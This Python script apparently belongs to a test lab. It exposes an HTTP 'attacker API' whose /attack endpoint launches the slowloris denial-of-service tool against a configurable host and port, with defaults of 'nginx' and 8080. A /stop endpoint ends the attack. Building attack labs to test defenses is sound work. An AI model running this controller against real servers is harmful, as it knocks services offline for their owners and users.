#!/usr/bin/env python3
import os
import signal
import subprocess
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

attack_process = None
target_host = os.getenv('TARGET_HOST', 'nginx')
target_port = os.getenv('TARGET_PORT', '8080')
socket_count = os.getenv('SOCKET_COUNT', '500')
sleep_time = os.getenv('SLEEP_TIME', '10')


class AttackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health':
            self._respond(200, b'{"status":"ok"}')
        else:
            self._respond(404, b'{"error":"not found"}')

    def do_POST(self):
        global attack_process
        if self.path == '/attack':
            if attack_process is None or attack_process.poll() is not None:
                attack_process = subprocess.Popen(
                    [
                        'slowloris',
                        target_host,
                        '-p',
                        target_port,
                        '-s',
                        socket_count,
                        '--sleeptime',
                        sleep_time,
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            self._respond(200, b'{"status":"attacking"}')
        elif self.path == '/stop':
            if attack_process and attack_process.poll() is None:
                attack_process.terminate()
                try:
                    attack_process.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    attack_process.kill()
            attack_process = None
            self._respond(200, b'{"status":"stopped"}')
        else:
            self._respond(404, b'{"error":"not found"}')

    def _respond(self, code, body):
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        pass


def shutdown(*_args):
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
    sys.exit(0)


signal.signal(signal.SIGTERM, shutdown)
signal.signal(signal.SIGINT, shutdown)
print(f'Attacker API listening on :8888; target={target_host}:{target_port}', flush=True)
HTTPServer(('0.0.0.0', 8888), AttackHandler).serve_forever()
